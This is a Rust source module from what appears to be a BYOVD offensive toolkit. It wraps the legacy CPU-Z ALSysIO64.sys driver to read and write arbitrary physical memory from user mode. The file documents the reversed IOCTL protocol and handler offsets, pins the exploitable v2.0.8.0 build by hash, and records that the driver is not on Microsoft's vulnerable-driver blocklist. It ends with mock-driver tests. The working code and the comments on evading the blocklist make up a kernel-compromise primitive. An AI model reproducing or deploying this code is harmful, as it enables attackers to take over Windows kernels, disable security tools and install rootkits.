//! ALSysIO64.sys — CPUID CPU-Z legacy driver (LOLDrivers id
//! 4d365dd0-34c3-492e-a2bd-c16266796ae5; KDU "alcpu" provider).
//!
//! **Status: NOT blocklisted** as of August 2026 (verified against SiPolicy
//! 10.0.29545.0 — `scripts/check_byovd_blocklist.py` A5). Cross-signed 2013
//! (grandfathered pre-1607 signing policy → still loads on Win10/11 24H2).
//!
//! ## ⚠ VERSION PIN: v2.0.x ONLY
//! The R/W IOCTLs exist in **v2.0.8.0** (SHA256 7196187f…47216d, pinned) and
//! siblings 2.0.9/2.0.11. **v2.1.0.0 REMOVED them**: its dispatch switch
//! covers 0x9C402604–0x9C402674 but 0x618/0x61C route to the default
//! `STATUS_NOT_IMPLEMENTED` arm (proven by jump-table decode of sample
//! d9aafc51…/7a20ca8f…, this repo `tmp/byovd-research/`). Loading v2.1.0.0
//! yields a driver that opens fine and then fails every R/W — exactly the
//! silently-dead-driver failure mode. The CI fetch gate pins the v2.0.8.0
//! SHA256, and so should any operator-side staging.
//!
//! Device: `\Device\ALSysIO` + `\DosDevices\ALSysIO` → open `\\.\ALSysIO`
//! (UTF-16 strings at file offsets 0x31e0/0x3200 in v2.0.8.0).
//!
//! ## Protocol (GROUND TRUTH: statically reversed from the pinned sample)
//!
//! Dispatch (v2.0.8.0, RVA 0x11a0): IRP_MJ_CREATE (0) and IRP_MJ_CLOSE (2)
//! complete immediately with STATUS_SUCCESS — **no access check**. Only
//! IRP_MJ_DEVICE_CONTROL (0xE) enters the switch; range gate
//! `code - 0x9C402604 <= 0x48` at +0x1c4, then a byte-remap + RVA jump table
//! (0x14d0 / 0x148c). Implemented codes: 604/608/610/614/618/61C/620/624/
//! 628/62C/630/634/638/63C/640/644/648/64C — everything else falls through
//! to 0x1461 with `STATUS_NOT_IMPLEMENTED` (0xC0000002).
//!
//! The two memory primitives (DeviceType 0x9C40, METHOD_BUFFERED,
//! FILE_ANY_ACCESS), matching KDU `idrv/alcpu.h` field-for-field:
//!
//! ```text
//!   READ  0x9C402618  (func 0x986)  handler RVA 0x1334:
//!     in  SystemBuffer: { u64 pa @0x0, u32 size @0x8 }   (12 bytes)
//!     out SystemBuffer: `size` bytes copied in at offset 0 — the driver
//!         OVERWRITES the request (single METHOD_BUFFERED system buffer).
//!     Information = size.  Body: MmMapIoSpace(pa, size) → memcpy →
//!     MmUnmapIoSpace (RVA 0x2eb0). No PA/size validation.
//!
//!   WRITE 0x9C40261C  (func 0x987)  handler RVA 0x1374:
//!     in  SystemBuffer: { u64 pa @0x0, u32 size @0x8, u8 data[…] @0xC }
//!     out none (Information = 0).  Body: MmMapIoSpace → memcpy from
//!     in+0xC → MmUnmapIoSpace (RVA 0x2f50). No PA/size validation.
//! ```
//!
//! No minimum-length gates anywhere on the dispatch path (unlike WDTKernel's
//! non-zero in/out requirement), so a write may pass a null/0 output buffer.
//!
//! ## Why raw_rw returns an error (operational-safety contract)
//!
//! Same as WDTKernel: [`crate::byovd::VulnDriverIoctl::raw_rw`] hands us a
//! kernel VIRTUAL address; ALSysIO64 feeds whatever it gets to MmMapIoSpace,
//! which would interpret VA bits as a PHYSICAL address and map garbage.
//! `supports_va() == false` makes [`crate::byovd::ByovdDriver`] fail up
//! front with `KrwError::Unavailable`; compose VA access via the phys-mode
//! bootstrap (`win::alsys` — CR3 scan + `VaKernelRw`), identical to the
//! WDT path.
//!
//! Sources: KDU `idrv/alcpu.{h,cpp}` (protocol) + static analysis of the
//! pinned v2.0.8.0 sample (capstone, `tmp/byovd-research/a208.disasm.txt`).

use crate::byovd::{DeviceIoControlFn, RwOp, VulnDriverIoctl};
use crate::KrwError;
use core::ffi::c_void;
use core::ptr;

pub struct AlsysIo;

/// Physical-memory read IOCTL — handler at v2.0.8.0 RVA 0x1334.
const ALSYSIO_IOCTL_READ: u32 = 0x9C402618;
/// Physical-memory write IOCTL — handler at v2.0.8.0 RVA 0x1374.
const ALSYSIO_IOCTL_WRITE: u32 = 0x9C40261C;
/// Fixed request header: { pa u64, size u32 } — payload follows at 0xC.
const ALSYSIO_HEADER_LEN: usize = 0xC;

impl VulnDriverIoctl for AlsysIo {
    fn device_path(&self) -> &[u16] {
        // \\.\ALSysIO — 7 code units after the \\.\ prefix. NOT NUL-terminated
        // (the ByovdDriver/win-open paths append it; same hazard documented in
        // win/wdt.rs open_wdt).
        static PATH: [u16; 11] = [
            '\\' as u16,
            '\\' as u16,
            '.' as u16,
            '\\' as u16,
            'A' as u16,
            'L' as u16,
            'S' as u16,
            'y' as u16,
            's' as u16,
            'I' as u16,
            'O' as u16,
        ];
        &PATH
    }

    fn read_ioctl(&self) -> u32 {
        ALSYSIO_IOCTL_READ
    }
    fn write_ioctl(&self) -> u32 {
        ALSYSIO_IOCTL_WRITE
    }

    fn blocklist_status(&self) -> &'static str {
        "CLEAN: not on Microsoft Vulnerable Driver Blocklist as of Aug 2026 \
         (LOLDrivers 4d365dd0). PIN v2.0.x — v2.1.0.0 removed the R/W IOCTLs."
    }

    /// Physical-address-only primitive: feeding it a VA would map garbage via
    /// MmMapIoSpace. Rejected up front by [`crate::byovd::ByovdDriver`]; this
    /// is the defense in depth (see the module doc + WDTKernel precedent,
    /// kernelsdk-1-6).
    fn supports_va(&self) -> bool {
        false
    }

    unsafe fn raw_rw(
        &self,
        _op: RwOp,
        _kaddr: u64,
        _buf: &mut [u8],
        _device: *mut c_void,
        _dioctl: DeviceIoControlFn,
    ) -> Result<(), usize> {
        // Cannot satisfy the VA-based KernelRw contract (see module doc).
        Err(0)
    }
}

impl AlsysIo {
    /// Physical-memory read. Input `{pa, size}`; driver MmMapIoSpace-maps `pa`
    /// and memcpy's `size` bytes into the shared system buffer (overwriting
    /// the request — we size the packet to cover both and copy the result out
    /// of offset 0).
    ///
    /// # Safety
    /// `dioctl` must be `kernel32!DeviceIoControl` and `device` a valid HANDLE
    /// to `\\.\ALSysIO`. `phys_addr` must be a real physical address.
    pub unsafe fn phys_read(
        device: *mut c_void,
        dioctl: DeviceIoControlFn,
        phys_addr: u64,
        buf: &mut [u8],
    ) -> Result<(), KrwError> {
        if buf.is_empty() {
            return Ok(());
        }
        // Single METHOD_BUFFERED packet: request header at 0, driver writes
        // the read data back at 0. Allocate max(header, len).
        let mut packet: alloc::vec::Vec<u8> =
            alloc::vec![0u8; core::cmp::max(ALSYSIO_HEADER_LEN, buf.len())];
        packet[0..8].copy_from_slice(&phys_addr.to_le_bytes());
        packet[8..0xC].copy_from_slice(&(buf.len() as u32).to_le_bytes());
        let mut ret: u32 = 0;
        let ok = unsafe {
            dioctl(
                device,
                ALSYSIO_IOCTL_READ,
                packet.as_ptr() as *const c_void,
                ALSYSIO_HEADER_LEN as u32,
                packet.as_mut_ptr() as *mut c_void,
                buf.len() as u32,
                &mut ret,
                ptr::null_mut(),
            )
        };
        if ok == 0 {
            return Err(KrwError::Other(
                "ALSysIO64 phys_read IOCTL failed (invalid physical address?)".into(),
            ));
        }
        buf.copy_from_slice(&packet[..buf.len()]);
        Ok(())
    }

    /// Physical-memory write. Input `{pa, size, data…}`; no output buffer
    /// needed (dispatch has no zero-length gates — verified on v2.0.8.0).
    ///
    /// # Safety
    /// Same contract as [`phys_read`](Self::phys_read).
    pub unsafe fn phys_write(
        device: *mut c_void,
        dioctl: DeviceIoControlFn,
        phys_addr: u64,
        buf: &[u8],
    ) -> Result<(), KrwError> {
        if buf.is_empty() {
            return Ok(());
        }
        let mut input: alloc::vec::Vec<u8> = alloc::vec![0u8; ALSYSIO_HEADER_LEN + buf.len()];
        input[0..8].copy_from_slice(&phys_addr.to_le_bytes());
        input[8..0xC].copy_from_slice(&(buf.len() as u32).to_le_bytes());
        input[ALSYSIO_HEADER_LEN..].copy_from_slice(buf);
        let mut ret: u32 = 0;
        let ok = unsafe {
            dioctl(
                device,
                ALSYSIO_IOCTL_WRITE,
                input.as_ptr() as *const c_void,
                input.len() as u32,
                ptr::null_mut(),
                0,
                &mut ret,
                ptr::null_mut(),
            )
        };
        if ok == 0 {
            return Err(KrwError::Other(
                "ALSysIO64 phys_write IOCTL failed (invalid physical address?)".into(),
            ));
        }
        Ok(())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Emulated physical memory the mock driver operates on.
    struct FakePhys {
        mem: std::vec::Vec<u8>,
    }

    std::thread_local! {
        static ACTIVE: core::cell::Cell<*const FakePhys> = const { core::cell::Cell::new(core::ptr::null()) };
    }

    /// Mock device side of `\\.\ALSysIO`: implements ONLY the documented wire
    /// format — wrong IOCTL or bad layout fails the call like a real driver.
    unsafe extern "system" fn mock_dioctl(
        _device: *mut c_void,
        ioctl: u32,
        in_buf: *const c_void,
        in_len: u32,
        out_buf: *mut c_void,
        out_len: u32,
        _bytes_returned: *mut u32,
        _overlapped: *mut c_void,
    ) -> i32 {
        let p = ACTIVE.with(|c| c.get());
        if p.is_null() {
            return 0;
        }
        let phys = unsafe { &*p };
        let cell = phys.mem.as_ptr() as *mut u8; // test-only aliasing
        match ioctl {
            x if x == ALSYSIO_IOCTL_READ => {
                if in_len as usize != ALSYSIO_HEADER_LEN {
                    return 0;
                }
                let req =
                    unsafe { core::slice::from_raw_parts(in_buf as *const u8, in_len as usize) };
                let pa = u64::from_le_bytes(req[0..8].try_into().unwrap()) as usize;
                let size = u32::from_le_bytes(req[8..0xC].try_into().unwrap()) as usize;
                if size as u32 != out_len
                    || pa.checked_add(size).map_or(true, |e| e > phys.mem.len())
                {
                    return 0;
                }
                unsafe {
                    core::ptr::copy_nonoverlapping(cell.add(pa), out_buf as *mut u8, size);
                }
                1
            }
            x if x == ALSYSIO_IOCTL_WRITE => {
                let req =
                    unsafe { core::slice::from_raw_parts(in_buf as *const u8, in_len as usize) };
                if req.len() < ALSYSIO_HEADER_LEN {
                    return 0;
                }
                let pa = u64::from_le_bytes(req[0..8].try_into().unwrap()) as usize;
                let size = u32::from_le_bytes(req[8..0xC].try_into().unwrap()) as usize;
                if req.len() != ALSYSIO_HEADER_LEN + size
                    || pa.checked_add(size).map_or(true, |e| e > phys.mem.len())
                {
                    return 0;
                }
                unsafe {
                    core::ptr::copy_nonoverlapping(
                        req[ALSYSIO_HEADER_LEN..].as_ptr(),
                        cell.add(pa),
                        size,
                    );
                }
                1
            }
            _ => 0,
        }
    }

    #[test]
    fn phys_read_uses_documented_wire_format() {
        let phys = FakePhys {
            mem: (0u8..=255).cycle().take(0x1000).collect(),
        };
        ACTIVE.with(|c| c.set(&phys as *const FakePhys));
        let mut buf = [0u8; 64];
        unsafe { AlsysIo::phys_read(core::ptr::null_mut(), mock_dioctl, 0x200, &mut buf).unwrap() };
        for (i, b) in buf.iter().enumerate() {
            assert_eq!(*b, ((0x200 + i) & 0xFF) as u8);
        }
    }

    #[test]
    fn phys_write_uses_documented_wire_format() {
        let phys = FakePhys {
            mem: std::vec![0u8; 0x1000],
        };
        ACTIVE.with(|c| c.set(&phys as *const FakePhys));
        let payload = [0xAAu8; 32];
        unsafe {
            AlsysIo::phys_write(core::ptr::null_mut(), mock_dioctl, 0x100, &payload).unwrap()
        };
        assert_eq!(&phys.mem[0x100..0x120], &[0xAAu8; 32]);
        assert_eq!(phys.mem[0x120], 0); // no over-write past size
    }

    #[test]
    fn empty_transfers_are_noops() {
        let mut b = [];
        unsafe { AlsysIo::phys_read(core::ptr::null_mut(), mock_dioctl, 0, &mut b).unwrap() };
        unsafe { AlsysIo::phys_write(core::ptr::null_mut(), mock_dioctl, 0, &b).unwrap() };
    }

    #[test]
    fn raw_rw_refuses_virtual_addresses() {
        let mut buf = [0u8; 8];
        let r = unsafe {
            AlsysIo.raw_rw(
                RwOp::Read,
                0xFFFF_8000_0000_0000,
                &mut buf,
                core::ptr::null_mut(),
                mock_dioctl,
            )
        };
        assert_eq!(r, Err(0));
        assert!(!AlsysIo.supports_va());
    }

    #[test]
    fn device_path_is_alsysio() {
        let p = AlsysIo.device_path();
        let s = std::string::String::from_utf16(p).unwrap();
        assert_eq!(s, r"\\.\ALSysIO");
    }
}
